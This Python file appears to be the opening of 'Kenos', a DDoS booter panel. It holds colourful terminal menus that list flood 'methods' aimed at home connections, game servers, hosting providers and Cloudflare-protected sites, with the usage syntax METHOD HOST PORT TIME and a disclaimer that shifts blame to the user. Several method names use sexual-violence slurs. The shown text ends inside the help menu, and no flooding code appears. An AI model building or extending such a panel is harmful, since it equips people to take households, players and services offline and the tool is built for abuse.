#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#    ___       ___       ___       ___       ___   
#   /\__\     /\  \     /\__\     /\  \     /\  \  
#  /:/ _/_   /::\  \   /:| _|_   /::\  \   /::\  \ 
# /::-"\__\ /::\:\__\ /::|/\__\ /:/\:\__\ /\:\:\__\
# \;:;-",-" \:\:\/  / \/|::/  / \:\/:/  / \:\:\/__/
#  |:|  |    \:\/  /    |:/  /   \::/  /   \::/  / 
#   \|__|     \/__/     \/__/     \/__/     \/__/  

# Libraries
import random, socket, time, threading, os, getpass, sys

# Maintanence Option
def __maintenance__():
    os.system("clear")
    print(f"                                 503 Service Unavailable                                     ")
    print(f"      Script Under maintenance. Contact d3fe4ted if there was no scheduled maintenance.      ")
    exit()

# Banners
banner = """\x1b[0;38;2;0;255;255m                                  ▄ •▄ ▄▄▄ . ▐ ▄       .▄▄ · 
\x1b[0;38;2;0;246;255m                                  █▌▄▌▪▀▄.▀·•█▌▐█▪     ▐█ ▀. 
\x1b[0;38;2;0;237;255m                                  ▐▀▀▄·▐▀▀▪▄▐█▐▐▌ ▄█▀▄ ▄▀▀▀█▄
\x1b[0;38;2;0;228;255m                                  ▐█.█▌▐█▄▄▌██▐█▌▐█▌.▐▌▐█▄▪▐█
\x1b[0;38;2;0;219;255m                                  ·▀  ▀ ▀▀▀ ▀▀ █▪ ▀█▄▀▪ ▀▀▀▀  II
\x1b[0;38;2;0;210;255m                         \x1b[0;37mWhen you're a threat you're always a target
\x1b[0;38;2;0;201;255m                       ╚═══╦═════════════════════════════════════╦═══╝
\x1b[0;38;2;0;192;255m                      ╔════╩═════════════════════════════════════╩════╗
\x1b[0;38;2;0;183;255m                      ║\x1b[0;32m                Welcome to Kenos!              \x1b[0;38;2;0;183;255m║
\x1b[0;38;2;0;174;255m                      ║\x1b[0;38;2;255;255;0m Powerful L4 and L7 Bypasses! \x1b[0;38;2;255;255;102mRan by \x1b[0m@\033[0;37:40md3fe4ted \x1b[0;38;2;0;174;255m║
\x1b[0;38;2;0;165;255m                      ║\x1b[0m         Type "help" for the commands.         \x1b[0;38;2;0;165;255m║
\x1b[0;38;2;0;156;255m                      ╚═══════╦═══════════════════════════════╦═══════╝
\x1b[0;38;2;0;147;255m                              ║    \x1b[0;33mConnection \x1b[0;37m[\x1b[0;32mEstablished\x1b[0;37m]   \x1b[0;38;2;0;147;255m║
\x1b[0;38;2;0;138;255m                              ╚═══════════════════════════════╝"""

rules = """\x1b[0;38;2;0;255;255m                             ╔══════════════════════════╗
\x1b[0;38;2;0;243;255m                             ║\x1b[0m   [\x1b[0;32m+\x1b[0m] Terms of Use [\x1b[0;32m+\x1b[0m]   \x1b[0;38;2;0;243;255m║
\x1b[0;38;2;0;231;255m                  ╔══════════╩══════════════════════════╩═══════════╗
\x1b[0;38;2;0;219;255m                  ║\x1b[0m - - - - - - -  I Understand That... - - - - - - \x1b[0;38;2;0;219;255m║
\x1b[0;38;2;0;207;255m                  ║\x1b[0m - Attacking Government Websites Are Prohibited  \x1b[0;38;2;0;207;255m║
\x1b[0;38;2;0;195;255m                  ║\x1b[0m - Everything I attack is my own Responsibility  \x1b[0;38;2;0;195;255m║
\x1b[0;38;2;0;183;255m                  ║\x1b[0m - I will absolutely NOT blame D3fe4ted at all   \x1b[0;38;2;0;183;255m║
\x1b[0;38;2;0;171;255m                  ╠═════════════════════════════════════════════════╣
\x1b[0;38;2;0;159;255m                  ║\x1b[0m        Do You Agree? - Type "\x1b[32myes\x1b[0m" or "\x1b[31mno\x1b[0m"       \x1b[0;38;2;0;159;255m║
\x1b[0;38;2;0;147;255m                  ╚═════════════════════════════════════════════════╝"""

tools = """\x1b[0;38;2;0;255;255m                                         ╔╦╗╔═╗╔═╗╦  ╔═╗
\x1b[0;38;2;0;246;255m                                          ║ ║ ║║ ║║  ╚═╗
\x1b[0;38;2;0;237;255m                                          ╩ ╚═╝╚═╝╩═╝╚═╝
\x1b[0;38;2;0;228;255m                	╔════════════════════════════════════════════════╗
\x1b[0;38;2;0;219;255m                	║\x1b[0m  Subnetcalc      ⮞ Subnet Calculator           \x1b[0;38;2;0;219;255m║
\x1b[0;38;2;0;210;255m                	║\x1b[0m  IPLookup        ⮞ Detailed IPLookup           \x1b[0;38;2;0;210;255m║
\x1b[0;38;2;0;201;255m                	║\x1b[0m  GeoIPLookup     ⮞ Geographic IPLookup         \x1b[0;38;2;0;201;255m║
\x1b[0;38;2;0;192;255m                	║\x1b[0m  ReverseIPLookup ⮞ Does a reverse ip lookup    \x1b[0;38;2;0;192;255m║
\x1b[0;38;2;0;183;255m                	║\x1b[0m  Resolve         ⮞ Resolves target host        \x1b[0;38;2;0;183;255m║
\x1b[0;38;2;0;174;255m                	║\x1b[0m                                                \x1b[0;38;2;0;174;255m║
\x1b[0;38;2;0;165;255m                	║\x1b[0m                    Pg. 1 / 1                   \x1b[0;38;2;0;165;255m║
\x1b[0;38;2;0;156;255m                	║             ╔══════════════════════╗           ║
\x1b[0;38;2;0;147;255m                	╚═════════════╣\x1b[0m (Tool) (IP/Argument) \x1b[0;38;2;0;147;255m╠═══════════╝
\x1b[0;38;2;0;138;255m                	              ╚══════════════════════╝"""

navigation = """\x1b[0;38;2;0;255;255m            		           ╔╗╔╔═╗╦  ╦╦╔═╗╔═╗╔╦╗╦╔═╗╔╗╔
\x1b[0;38;2;0;246;255m            		           ║║║╠═╣╚╗╔╝║║ ╦╠═╣ ║ ║║ ║║║║
\x1b[0;38;2;0;237;255m            		           ╝╚╝╩ ╩ ╚╝ ╩╚═╝╩ ╩ ╩ ╩╚═╝╝╚╝
\x1b[0;38;2;0;228;255m            		  ╔══════════════════════════════════════════╗
\x1b[0;38;2;0;219;255m            		  ║\x1b[0m                                          \x1b[0;38;2;0;219;255m║
\x1b[0;38;2;0;210;255m            		  ║\x1b[0m      Welcome to the navigation page,     \x1b[0;38;2;0;210;255m║
\x1b[0;38;2;0;201;255m            		  ║\x1b[0m     to use the navigation you have to    \x1b[0;38;2;0;201;255m║
\x1b[0;38;2;0;192;255m            		  ║\x1b[0m  type the command then the page number.  \x1b[0;38;2;0;192;255m║
\x1b[0;38;2;0;183;255m            		  ║\x1b[0m                                          \x1b[0;38;2;0;183;255m║
\x1b[0;38;2;0;174;255m            		  ║\x1b[0m         E.g, "methodsx2", "homex2"       \x1b[0;38;2;0;174;255m║
\x1b[0;38;2;0;165;255m            		  ║\x1b[0m                Pg. 1 / 1                 \x1b[0;38;2;0;165;255m║
\x1b[0;38;2;0;156;255m            		  ║           ╔══════════════════╗           ║
\x1b[0;38;2;0;147;255m            		  ╚═══════════╣\x1b[0m (command) (page) \x1b[0;38;2;0;147;255m╠═══════════╝
\x1b[0;38;2;0;138;255m            		              ╚══════════════════╝"""

all = """\x1b[0;38;2;0;255;255m			            ╔═╗╦  ╦    ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\x1b[0;38;2;0;249;255m                                    ╠═╣║  ║    ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\x1b[0;38;2;0;243;255m                                    ╩ ╩╩═╝╩═╝  ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\x1b[0;38;2;0;237;255m                                ═════════════╦═════════════╦════════════
\x1b[0;38;2;0;231;255m               ╔═══════════════╗ ╔═══════════╩═══╗  ╔══════╩════════╗ ╔═══════════════╗
\x1b[0;38;2;0;225;255m               ║\x1b[0m      UDP      \x1b[0;38;2;0;225;255m╠═╣\x1b[0m      DNS      \x1b[0;38;2;0;225;255m╠══╣\x1b[0m   HOMEFUCK    \x1b[0;38;2;0;225;255m╠═╣\x1b[0m    FORTNITE   \x1b[0;38;2;0;225;255m║
\x1b[0;38;2;0;219;255m               ║\x1b[0m   UDPFLOOD    \x1b[0;38;2;0;219;255m╠═╣\x1b[0m      STD      \x1b[0;38;2;0;219;255m╠══╣\x1b[0m    UDPMIX     \x1b[0;38;2;0;219;255m╠═╣\x1b[0m      OVH      \x1b[0;38;2;0;219;255m║
\x1b[0;38;2;0;213;255m               ╚═══════════════╝ ╚════╦════╦═════╝  ╚═════╦════╦════╝ ╚═══════════════╝
\x1b[0;38;2;0;207;255m                       ╔══════════════╩╗  ╔╩══════════════╩╗  ╔╩══════════════╗
\x1b[0;38;2;0;201;255m                       ║\x1b[0m      VSE      \x1b[0;38;2;0;201;255m╠══╣\x1b[0m      TCP       \x1b[0;38;2;0;201;255m╠══╣\x1b[0m   HOMEKILL    \x1b[0;38;2;0;201;255m║
\x1b[0;38;2;0;195;255m                      ╔╣\x1b[0m      SYN      \x1b[0;38;2;0;195;255m╠══╣\x1b[0m    HOMESLAP    \x1b[0;38;2;0;195;255m╠══╣\x1b[0m   HOMENULL    \x1b[0;38;2;0;195;255m╠╗
\x1b[0;38;2;0;189;255m                     ╔╝╚═══════════════╝  ╚════════════════╝  ╚═══════════════╝╚╗
\x1b[0;38;2;0;183;255m                     ╚════════════════════╦════════════════╦════════════════════╝
\x1b[0;38;2;0;177;255m              ═════════╦═════════════════╦╩════════════════╩╦═════════════════╦═════════
\x1b[0;38;2;0;171;255m               ╔═══════╩═══════╗ ╔═══════╩═══════╗  ╔═══════╩═══════╗ ╔═══════╩═══════╗
\x1b[0;38;2;0;165;255m               ║\x1b[0m     UDPV2     \x1b[0;38;2;0;165;255m╠═╣\x1b[0m    CFSOCKET   \x1b[0;38;2;0;165;255m╠══╣\x1b[0m   HTTPEVEN    \x1b[0;38;2;0;165;255m╠═╣\x1b[0m    OVHNAT     \x1b[0;38;2;0;165;255m║
\x1b[0;38;2;0;159;255m               ║\x1b[0m    CFBYPASS   \x1b[0;38;2;0;159;255m║ ║\x1b[0m   HTTPCOOKIE  \x1b[0;38;2;0;159;255m║  ║\x1b[0m   HTTPFUZZ    \x1b[0;38;2;0;159;255m║ ║\x1b[0m    OVHAMP     \x1b[0;38;2;0;159;255m║
\x1b[0;38;2;0;153;255m               ║\x1b[0m     LDAP      \x1b[0;38;2;0;153;255m╠═╣\x1b[0m  HTTPCOOKIE2  \x1b[0;38;2;0;153;255m╠══╣\x1b[0m    NFODROP    \x1b[0;38;2;0;153;255m╠═╣\x1b[0m   NFOCRUSH    \x1b[0;38;2;0;153;255m║
\x1b[0;38;2;0;147;255m               ╚═══════════════╝ ╚═══════════════╝  ╚═══════════════╝ ╚═══════════════╝
\x1b[0;38;2;0;137;255m                                             \x1b[0mPg. 1 / 2
\x1b[0;38;2;0;134;255m                                  ╔═══════════════════════════════╗
\x1b[0;38;2;0;129;255m                                  ║\x1b[0m (METHOD) (HOST) (PORT) (TIME) \x1b[0;38;2;0;141;255m║
\x1b[0;38;2;0;126;255m                                  ╚═══════════════════════════════╝"""

allx2 = """\x1b[0;38;2;0;255;255m			            ╔═╗╦  ╦    ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\x1b[0;38;2;0;249;255m                                    ╠═╣║  ║    ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\x1b[0;38;2;0;243;255m                                    ╩ ╩╩═╝╩═╝  ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\x1b[0;38;2;0;237;255m                                ═════════════╦═════════════╦════════════
\x1b[0;38;2;0;231;255m               ╔═══════════════╗ ╔═══════════╩═══╗  ╔══════╩════════╗ ╔═══════════════╗
\x1b[0;38;2;0;225;255m               ║\x1b[0m    GREETH     \x1b[0;38;2;0;225;255m╠═╣\x1b[0m    ONHOLD     \x1b[0;38;2;0;225;255m╠══╣\x1b[0m    OVHDOWN    \x1b[0;38;2;0;225;255m╠═╣\x1b[0m  HYDRAKILLER  \x1b[0;38;2;0;225;255m║
\x1b[0;38;2;0;219;255m               ║\x1b[0m    TELNET     \x1b[0;38;2;0;219;255m╠═╣\x1b[0m    OVHKILL    \x1b[0;38;2;0;219;255m╠══╣\x1b[0m     SSDP      \x1b[0;38;2;0;219;255m╠═╣\x1b[0m    NFONULL    \x1b[0;38;2;0;219;255m║
\x1b[0;38;2;0;213;255m               ╚═══════════════╝ ╚════╦════╦═════╝  ╚═════╦════╦════╝ ╚═══════════════╝
\x1b[0;38;2;0;207;255m                       ╔══════════════╩╗  ╔╩══════════════╩╗  ╔╩══════════════╗
\x1b[0;38;2;0;201;255m                       ║\x1b[0m    OVHNULL    \x1b[0;38;2;0;201;255m╠══╣\x1b[0m  ROBLOXBYPASS  \x1b[0;38;2;0;201;255m╠══╣\x1b[0m    NFORAPE    \x1b[0;38;2;0;201;255m║
\x1b[0;38;2;0;195;255m                      ╔╣\x1b[0m    CPUKILL    \x1b[0;38;2;0;195;255m╠══╣\x1b[0m    TCPRAPE     \x1b[0;38;2;0;195;255m╠══╣\x1b[0m     UDPRAW    \x1b[0;38;2;0;195;255m╠╗
\x1b[0;38;2;0;189;255m                     ╔╝╚═══════════════╝  ╚════════════════╝  ╚═══════════════╝╚╗
\x1b[0;38;2;0;183;255m                     ╚════════════════════╦════════════════╦════════════════════╝
\x1b[0;38;2;0;177;255m              ═════════╦═════════════════╦╩════════════════╩╦═════════════════╦═════════
\x1b[0;38;2;0;171;255m               ╔═══════╩═══════╗ ╔═══════╩═══════╗  ╔═══════╩═══════╗ ╔═══════╩═══════╗
\x1b[0;38;2;0;165;255m               ║\x1b[0m    TCPRAW     \x1b[0;38;2;0;165;255m╠═╣\x1b[0m    VSERAW     \x1b[0;38;2;0;165;255m╠══╣\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;165;255m╠═╣\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;165;255m║
\x1b[0;38;2;0;159;255m               ║\x1b[0m    HEXRAW     \x1b[0;38;2;0;159;255m║ ║\x1b[0m    SYNRAW     \x1b[0;38;2;0;159;255m║  ║\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;159;255m║ ║\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;159;255m║
\x1b[0;38;2;0;153;255m               ║\x1b[0m    STDRAW     \x1b[0;38;2;0;153;255m╠═╣\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;153;255m╠══╣\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;153;255m╠═╣\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;153;255m║
\x1b[0;38;2;0;147;255m               ╚═══════════════╝ ╚═══════════════╝  ╚═══════════════╝ ╚═══════════════╝
\x1b[0;38;2;0;137;255m                                             \x1b[0mPg. 2 / 2
\x1b[0;38;2;0;134;255m                                  ╔═══════════════════════════════╗
\x1b[0;38;2;0;129;255m                                  ║\x1b[0m (METHOD) (HOST) (PORT) (TIME) \x1b[0;38;2;0;141;255m║
\x1b[0;38;2;0;126;255m                                  ╚═══════════════════════════════╝"""

vip = """\x1b[0;38;2;0;255;255m                                      ╦  ╦╦╔═╗
\x1b[0;38;2;0;249;255m                                      ╚╗╔╝║╠═╝
\x1b[0;38;2;0;243;255m                                       ╚╝ ╩╩  
\x1b[0;38;2;0;237;255m                        ╔══════════════════════════════════╗
\x1b[0;38;2;0;231;255m           	  ╔═════╩════════════════╦═════════════════╩═════╗
\x1b[0;38;2;0;225;255m          ╔═══════╩═══════╗══════╔═══════╩═══════╗═══════╔═══════╩═══════╗
\x1b[0;38;2;0;219;255m          ║\x1b[0m    CITRIX     \x1b[0;38;2;0;219;255m║      ║\x1b[0m   KILLALLV2   \x1b[0;38;2;0;219;255m║       ║\x1b[0m   UDPRAPEV3   \x1b[0;38;2;0;219;255m║
\x1b[0;38;2;0;213;255m          ║\x1b[0m     SNMP      \x1b[0;38;2;0;213;255m║      ║\x1b[0m   KILLALLV3   \x1b[0;38;2;0;213;255m║       ║\x1b[0m   UDPBYPASS   \x1b[0;38;2;0;213;255m║
\x1b[0;38;2;0;207;255m          ║\x1b[0m   SNMPBULK    \x1b[0;38;2;0;207;255m║      ║\x1b[0m    UDPRAPE    \x1b[0;38;2;0;207;255m║       ║\x1b[0m    ICMPRAPE   \x1b[0;38;2;0;207;255m║
\x1b[0;38;2;0;201;255m          ║\x1b[0m    KILLALL    \x1b[0;38;2;0;201;255m║      ║\x1b[0m   UDPRAPEV2   \x1b[0;38;2;0;201;255m║       ║\x1b[0m      COAP     \x1b[0;38;2;0;201;255m║
\x1b[0;38;2;0;195;255m          ╚═══════╦═══════╝══════╚═══════╦═══════╝═══════╚═══════╦═══════╝
\x1b[0;38;2;0;189;255m          ╔═══════╩═══════╗══════╔═══════╩═══════╗═══════╔═══════╩═══════╗
\x1b[0;38;2;0;183;255m          ║\x1b[0m    COAPV2     \x1b[0;38;2;0;219;255m║      ║\x1b[0m     IPSEC     \x1b[0;38;2;0;219;255m║       ║\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;219;255m║
\x1b[0;38;2;0;177;255m          ║\x1b[0m     STUN      \x1b[0;38;2;0;213;255m║      ║\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;213;255m║       ║\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;213;255m║
\x1b[0;38;2;0;171;255m          ║\x1b[0m     STOMP     \x1b[0;38;2;0;207;255m║      ║\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;207;255m║       ║\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;207;255m║
\x1b[0;38;2;0;165;255m          ║\x1b[0m    RDPUDP     \x1b[0;38;2;0;201;255m║      ║\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;201;255m║       ║\x1b[31m   XXXXXXXXX   \x1b[0;38;2;0;201;255m║
\x1b[0;38;2;0;159;255m          ╚═══════════════╝══════╚═══════════════╝═══════╚═══════════════╝
\x1b[0;38;2;0;153;255m                                     \x1b[0mPg. 1 / 1
\x1b[0;38;2;0;147;255m                          ╔═══════════════════════════════╗
\x1b[0;38;2;0;141;255m                          ║\x1b[0m (METHOD) (HOST) (PORT) (TIME) \x1b[0;38;2;0;141;255m║
\x1b[0;38;2;0;135;255m                          ╚═══════════════════════════════╝"""

layer4 = """\x1b[0;38;2;0;255;255m                              ╦  ╔═╗╦ ╦╔═╗╦═╗  ╦ ╦
\x1b[0;38;2;0;242;255m                              ║  ╠═╣╚╦╝║╣ ╠╦╝  ╚═╣
\x1b[0;38;2;0;229;255m                              ╩═╝╩ ╩ ╩ ╚═╝╩╚═    ╩
\x1b[0;38;2;0;216;255m                     ═════════════╦═════════════╦════════════
\x1b[0;38;2;0;203;255m            ╔═════════════╦═══════╩══════╦══════╩═══════╦═════════════╗
\x1b[0;38;2;0;190;255m            ║\x1b[0m     UDP    \x1b[0;38;2;0;190;255m╔╩╗\x1b[0m     STD    \x1b[0;38;2;0;190;255m╔╩╗\x1b[0m    SYN     \x1b[0;38;2;0;190;255m╔╩╗\x1b[0m  UDPFLOOD  \x1b[0;38;2;0;190;255m║
\x1b[0;38;2;0;177;255m            ║\x1b[0m    UDPV2   \x1b[0;38;2;0;177;255m║ ║\x1b[0m     DNS    \x1b[0;38;2;0;177;255m║ ║\x1b[0m   UDPMIX   \x1b[0;38;2;0;177;255m║ ║\x1b[0m    LDAP    \x1b[0;38;2;0;177;255m║
\x1b[0;38;2;0;164;255m            ║\x1b[0m     VSE    \x1b[0;38;2;0;164;255m╚╦╝\x1b[0m     TCP    \x1b[0;38;2;0;164;255m╚╦╝\x1b[0m   TCPSYN   \x1b[0;38;2;0;164;255m╚╦╝\x1b[0m   GREETH   \x1b[0;38;2;0;164;255m║
\x1b[0;38;2;0;153;255m            ╚═════════════╩══════════════╩══════════════╩═════════════╝
\x1b[0;38;2;0;151;255m                                     \x1b[0mPg. 1 / 1
\x1b[0;38;2;0;147;255m                          ╔═══════════════════════════════╗
\x1b[0;38;2;0;141;255m                          ║\x1b[0m (METHOD) (HOST) (PORT) (TIME) \x1b[0;38;2;0;141;255m║
\x1b[0;38;2;0;135;255m                          ╚═══════════════════════════════╝"""

layer4x2 = """\x1b[0;38;2;0;255;255m                              ╦  ╔═╗╦ ╦╔═╗╦═╗  ╦ ╦
\x1b[0;38;2;0;242;255m                              ║  ╠═╣╚╦╝║╣ ╠╦╝  ╚═╣
\x1b[0;38;2;0;229;255m                              ╩═╝╩ ╩ ╩ ╚═╝╩╚═    ╩
\x1b[0;38;2;0;216;255m                     ═════════════╦═════════════╦════════════
\x1b[0;38;2;0;203;255m            ╔═════════════╦═══════╩══════╦══════╩═══════╦═════════════╗
\x1b[0;38;2;0;190;255m            ║\x1b[0m   CPUKILL  \x1b[0;38;2;0;190;255m╔╩╗\x1b[0m   TCPRAW   \x1b[0;38;2;0;190;255m╔╩╗\x1b[0m   SYNRAW   \x1b[0;38;2;0;190;255m╔╩╗\x1b[31m  XXXXXXXX  \x1b[0;38;2;0;190;255m║
\x1b[0;38;2;0;177;255m            ║\x1b[0m   TCPRAPE  \x1b[0;38;2;0;177;255m║ ║\x1b[0m   HEXRAW   \x1b[0;38;2;0;177;255m║ ║\x1b[0m   VSERAW   \x1b[0;38;2;0;177;255m║ ║\x1b[31m  XXXXXXXX  \x1b[0;38;2;0;177;255m║
\x1b[0;38;2;0;164;255m            ║\x1b[0m   UDPRAW   \x1b[0;38;2;0;164;255m╚╦╝\x1b[0m   STDRAW   \x1b[0;38;2;0;164;255m╚╦╝\x1b[0m    JUNK    \x1b[0;38;2;0;164;255m╚╦╝\x1b[31m  XXXXXXXX  \x1b[0;38;2;0;164;255m║
\x1b[0;38;2;0;151;255m            ╚═════════════╩══════════════╩══════════════╩═════════════╝"""

layer7 = """\x1b[0;38;2;0;255;255m                                 ╦  ╔═╗╦ ╦╔═╗╦═╗  ╔══╗
\x1b[0;38;2;0;248;255m                           	 ║  ╠═╣╚╦╝║╣ ╠╦╝    ╔╝
\x1b[0;38;2;0;241;255m                           	 ╩═╝╩ ╩ ╩ ╚═╝╩╚═    ╩
\x1b[0;38;2;0;234;255m               	    ╔══════════════════════════════════════════╗
\x1b[0;38;2;0;227;255m               	    ║\x1b[0m                 HTTP-GET                 \x1b[0;38;2;0;227;255m║
\x1b[0;38;2;0;220;255m               	    ║\x1b[0m                 CFBYPASS                 \x1b[0;38;2;0;220;255m║
\x1b[0;38;2;0;213;255m               	    ║\x1b[0m                HTTPCOOKIE                \x1b[0;38;2;0;213;255m║
\x1b[0;38;2;0;206;255m                    ║\x1b[0m                HTTPCOOKIE2               \x1b[0;38;2;0;206;255m║
\x1b[0;38;2;0;199;255m               	    ║\x1b[0m                 HTTPEVEN                 \x1b[0;38;2;0;199;255m║
\x1b[0;38;2;0;192;255m                    ║\x1b[0m                 HTTPFUZZ                 \x1b[0;38;2;0;192;255m║
\x1b[0;38;2;0;185;255m                    ║\x1b[31m   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX   \x1b[0;38;2;0;185;255m║
\x1b[0;38;2;0;178;255m                    ║\x1b[31m   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX   \x1b[0;38;2;0;178;255m║
\x1b[0;38;2;0;171;255m               	    ║\x1b[31m   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX   \x1b[0;38;2;0;171;255m║
\x1b[0;38;2;0;164;255m               	    ║\x1b[31m   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX   \x1b[0;38;2;0;164;255m║
\x1b[0;38;2;0;157;255m               	    ║\x1b[0m                Pg. 1 / 1                 \x1b[0;38;2;0;157;255m║
\x1b[0;38;2;0;150;255m               	    ║     ╔═══════════════════════════════╗    ║
\x1b[0;38;2;0;143;255m               	    ╚═════╣\x1b[0m (METHOD) (HOST) (PORT) (TIME) \x1b[0;38;2;0;143;255m╠════╝
\x1b[0;38;2;0;136;255m               	          ╚═══════════════════════════════╝"""

servers = """\x1b[0;38;2;0;255;255m                             ╔═╗╔═╗╦═╗╦  ╦╔═╗╦═╗╔═╗
\x1b[0;38;2;0;244;255m                             ╚═╗║╣ ╠╦╝╚╗╔╝║╣ ╠╦╝╚═╗
\x1b[0;38;2;0;233;255m                             ╚═╝╚═╝╩╚═ ╚╝ ╚═╝╩╚═╚═╝
\x1b[0;38;2;0;222;255m            ╔══════════════════════════╦════════════════════════════╗
\x1b[0;38;2;0;211;255m            ║\x1b[0m      FORTNITE ● OVH      \x1b[0;38;2;0;211;255m║\x1b[0m      OVHAMP ● NFOCRUSH     \x1b[0;38;2;0;211;255m║
\x1b[0;38;2;0;211;255m            ║\x1b[0m     NFODROP ● OVHNAT     \x1b[0;38;2;0;211;255m║\x1b[0m      TELNET ● OVHKILL      \x1b[0;38;2;0;211;255m║
\x1b[0;38;2;0;200;255m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\x1b[0;38;2;0;189;255m             ║\x1b[0m     OVHDOWN ● SSDP     \x1b[0;38;2;0;189;255m║ ║\x1b[0m  OVHNULL ● ROBLOXBYPASS  \x1b[0;38;2;0;189;255m║
\x1b[0;38;2;0;178;255m             ║\x1b[0m  HYDRAKILLER ● NFONULL \x1b[0;38;2;0;178;255m║ ║\x1b[0m    NFORAPE ● \x1b[31mXXXXXXXXX   \x1b[0;38;2;0;178;255m║
\x1b[0;38;2;0;167;255m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\x1b[0;38;2;0;156;255m            ║\x1b[0m - - - - - - - METHOD (IP) (PORT) (TIME) - - - - - - - \x1b[0;38;2;0;156;255m║
\x1b[0;38;2;0;145;255m            ╚═══════════════════════════════════════════════════════╝
\x1b[0;38;2;0;145;255m                                  \x1b[0mPg. 1 / 1"""

home = """\x1b[0;38;2;0;255;255m            		                    ╦ ╦╔═╗╔╦╗╔═╗
\x1b[0;38;2;0;246;255m                   		            ╠═╣║ ║║║║║╣ 
\x1b[0;38;2;0;237;255m                   		            ╩ ╩╚═╝╩ ╩╚═╝
\x1b[0;38;2;0;228;255m                         ╔══════════════════════════════════════════════╗
\x1b[0;38;2;0;219;255m                 ╔═══════╩═══════╗                              ╔═══════╩═══════╗
\x1b[0;38;2;0;210;255m                 ║\x1b[0m   HOMEFUCK    \x1b[0;38;2;0;210;255m║                              ║\x1b[0m    ONHOLD     \x1b[0;38;2;0;210;255m║
\x1b[0;38;2;0;201;255m                 ║\x1b[0m   HOMESLAP    \x1b[0;38;2;0;201;255m║                              ║\x1b[31m  XXXXXXXXXXX  \x1b[0;38;2;0;201;255m║
\x1b[0;38;2;0;192;255m                 ║\x1b[0m   HOMENULL    \x1b[0;38;2;0;192;255m║                              ║\x1b[31m  XXXXXXXXXXX  \x1b[0;38;2;0;192;255m║
\x1b[0;38;2;0;183;255m                 ║\x1b[0m   HOMEKILL    \x1b[0;38;2;0;183;255m║                              ║\x1b[31m  XXXXXXXXXXX  \x1b[0;38;2;0;183;255m║
\x1b[0;38;2;0;174;255m                 ╚═══════════════╝                              ╚═══════════════╝
\x1b[0;38;2;0;165;255m            		  
\x1b[0;38;2;0;156;255m            		         ╔═══════════════════════════════╗
\x1b[0;38;2;0;147;255m            		         ║\x1b[0m (METHOD) (HOST) (PORT) (TIME) \x1b[0;38;2;0;147;255m║
\x1b[0;38;2;0;138;255m            		         ╚═══════════════════════════════╝
\x1b[0m"""

methods = """\x1b[0;38;2;0;255;255m                          	     ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
\x1b[0;38;2;0;245;255m                                     ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
\x1b[0;38;2;0;235;255m                                     ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
\x1b[0;38;2;0;225;255m            		  ╔══════════════════════════════════════════╗
\x1b[0;38;2;0;215;255m                          ║\x1b[0m    All     \x1b[0;38;2;0;215;255m⮞\x1b[0m All Methods on Kenos        \x1b[0;38;2;0;215;255m║
\x1b[0;38;2;0;205;255m            		  ║\x1b[0m    VIP     \x1b[0;38;2;0;205;255m⮞\x1b[0m All vip methods             \x1b[0;38;2;0;205;255m║
\x1b[0;38;2;0;195;255m            		  ║\x1b[0m    Servers \x1b[0;38;2;0;195;255m⮞\x1b[0m Methods for servers         \x1b[0;38;2;0;195;255m║
\x1b[0;38;2;0;185;255m            		  ║\x1b[0m    Layer7  \x1b[0;38;2;0;185;255m⮞\x1b[0m Methods for web-apps        \x1b[0;38;2;0;185;255m║
\x1b[0;38;2;0;175;255m                          ║\x1b[0m    Layer4  \x1b[0;38;2;0;175;255m⮞\x1b[0m Methods for anything l4     \x1b[0;38;2;0;175;255m║
\x1b[0;38;2;0;165;255m            		  ║\x1b[0m    Home    \x1b[0;38;2;0;165;255m⮞\x1b[0m Methods for Homes           \x1b[0;38;2;0;165;255m║
\x1b[0;38;2;0;155;255m            		  ╚══════════════════════════════════════════╝"""

help = """\x1b[0;38;2;0;255;255m                                       	   ╦ ╦╔═╗╦  ╔═╗
\x1b[0;38;2;0;245;255m                                       	   ╠═╣║╣ ║  ╠═╝
\x1b[0;38;2;0;235;255m                                       	   ╩ ╩╚═╝╩═╝╩  
\x1b[0;38;2;0;225;255m               	    	╔════════════╦═════════════════════════════════╗
\x1b[0;38;2;0;215;255m               	    	║\x1b[0m Methods    \x1b[0;38;2;0;215;255m║\x1b[0m Shows Methods.                  \x1b[0;38;2;0;215;255m║
\x1b[0;38;2;0;205;255m                	║\x1b[0m Attacks    \x1b[0;38;2;0;205;255m║\x1b[0m Shows Concurrents.              \x1b[0;38;2;0;205;255m║
\x1b[0;38;2;0;195;255m                	║\x1b[0m Stop       \x1b[0;38;2;0;195;255m║\x1b[0m Stops all ongoing attacks.      \x1b[0;38;2;0;195;255m║
\x1b[0;38;2;0;185;255m                	║\x1b[0m Tools      \x1b[0;38;2;0;185;255m║\x1b[0m Simple IP Tools.                \x1b[0;38;2;0;185;255m║
